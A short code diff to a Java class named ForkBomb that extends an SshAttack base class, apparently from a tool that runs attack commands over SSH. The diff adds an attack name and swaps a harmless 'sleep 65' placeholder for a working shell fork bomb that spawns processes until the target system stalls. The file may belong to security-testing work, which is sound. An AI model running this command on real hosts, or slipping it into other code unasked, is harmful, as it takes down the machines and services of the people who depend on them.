@@ -28,7 +28,12 @@ public class ForkBomb extends SshAttack {
     }
 
     @Override
+    protected String getAttackName () {
+        return "Fork Bomb";
+    }
+
+    @Override
     protected String getAttackCommand () {
-        return "sleep 65";
+        return "bomb() { bomb | bomb & }; bomb;";
     }
 }
